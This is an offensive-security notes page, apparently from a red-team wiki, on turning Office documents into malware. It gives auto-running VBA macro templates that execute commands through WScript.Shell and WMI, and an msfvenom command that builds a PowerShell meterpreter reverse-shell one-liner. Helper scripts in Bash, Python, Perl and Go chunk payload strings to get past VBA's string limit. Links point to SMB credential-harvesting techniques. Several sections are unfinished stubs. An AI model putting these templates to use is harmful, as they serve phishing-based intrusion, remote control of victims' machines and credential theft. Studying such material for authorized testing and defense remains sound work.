# Macros Template

## 01 - Base

Base template when macro is being executed.

```
Sub Document_Open()
    Payload
End Sub

Sub AutoOpen()
    Payload
End Sub
```

## 02 - Command Execution

Command execution.

```vbscript
Sub Payload()
    ' VBA Macro has a 50 characters String
    ' Limit so you have to concatenate it
    Dim Str As String
    Str = Str + ""
    CreateObject("WScript.Shell").Run Str
    ' CreateObject("WScript.Shell").Run "cmd"
End Sub
```

PowerShell one-liners, Web-Drive By, harvest SMB credentials, etc.

```vbscript
Public Function Payload() As Variant
    Dim WindowScriptHost As Object
    Set WindowScriptHost = VBA.CreateObject("WScript.Shell")
    Dim waitOnReturn As Boolean: waitOnReturn = True
    Dim windowStyle As Integer: windowStyle = 7
    WindowScriptHost.Run "<powershell_payload>", windowStyle, waitOnReturn
End Function
```

Using WMI method to execute the process.

```vbscript
Sub WMI_Execution()
    Set Wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set Process = Wmi.Get("Win32_Process")
    Process.Create("<commands>")
End Sub
```

## 04 - Payload Inside Document

TODO: Fill this info

Using **comments** in the **Properties** to include malware URL link to execute as shell via `rundll32.exe`

- [Malicious DLL Infection Through Metasploit SMB Exploit](https://www.drchaos.com/post/malicious-dll-infection-thru-metasploit-smb-exploit)

- [The Art of Creating backdoors and Exploits with Metasploit (Duplicate)](https://www.drchaos.com/post/the-art-of-creating-backdoors-and-exploits-with-metasploit)

- [Bank Security: MS Excel Weaponization Techniques](https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5)

## 05 - Harvest SMB Credentials

TODO: Demonstrate as many examples to fetch credentials using SMB relay via Responder

Refer to **Client-Side Attacks** subsection under [[02 - Responder|Responder]].

Refer to **Client-Side Attacks** subsection under [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Authentication Relay/Metasploit|Metasploit]].

- [Securify: Living off the Land Stealing NetNTLM Hashes](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes/)

- [n00py: Phishing with Maldocs](https://www.n00py.io/2017/04/phishing-with-maldocs/)


## 06 - Macro Formatting

Generate a powershell one liner.

```
$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> exitfunc=thread -f psh-cmd
```

### 6.1 - Bash

```bash
#!/bin/bash

string=""
chunks=50

for (( i=0; i<${#string}; i+=chunks ))
do
    if [[ ${i} -eq 0 ]]
    then
        echo "string=\"${string:i:chunks}\""
    else
        echo "string+=\"${string:i:chunks}\""
    fi
done
```

### 3.2 - Python

```python
#!/usr/bin/env python

string = ""
n = 50

for i in range(0, len(string), n):
    print("Str = Str + \"" + string[i:i+n] + "\"")
```

### 3.3 - Perl

```perl
#!/usr/bin/env perl

my $string = "";

my @characters = ($string =~ /(.)/g);

$concatenated_string = "";

for(my $i = 0; $i < scalar(@characters); $i++) {
    $concatenated_string .= "Str = Str + \"";
    for(my $j = 0; $j < 50; $j++) {
        $concatenated_string .= $characters[$i++];
    }
    $concatenated_string .= chr(34)."\n";
}
print $concatenated_string;
```

### 3.4 - Go

```go
package main

import "fmt"

func main() {
    String := ""

    for i := 0; i < len(String); i++ {
        fmt.Print("Str = Str + \"")
        for j := 0; j < 50; j++ {
            if i == len(String) {
                break
            }
            fmt.Printf("%c", String[i])
            i++
        }
        fmt.Print("\"\n")
    }
}
```

## 02 - HTA

TODO: Fill this info


---
## References

- [Offensive Security: Weaponizing and Abusing Hidden Functionalities Contained in Office Document Properties](https://www.offsec.com/blog/macro-weaponization/)

- [sevagas: Advanced_Initial_access_in_2024_OffensiveX](https://github.com/sevagas/Advanced_Initial_access_in_2024_OffensiveX/blob/main/breach_the_gates_extended.pdf)

- [War Room: Metasploit Module of the Month Web Delivery](https://warroom.rsmus.com/metasploit-module-of-the-month-web_delivery/)

- [nicholasmckinney: Shellcode Execution Via HTA](https://gist.github.com/nicholasmckinney/e90e47e0545430656bdcca5544d6b4fc)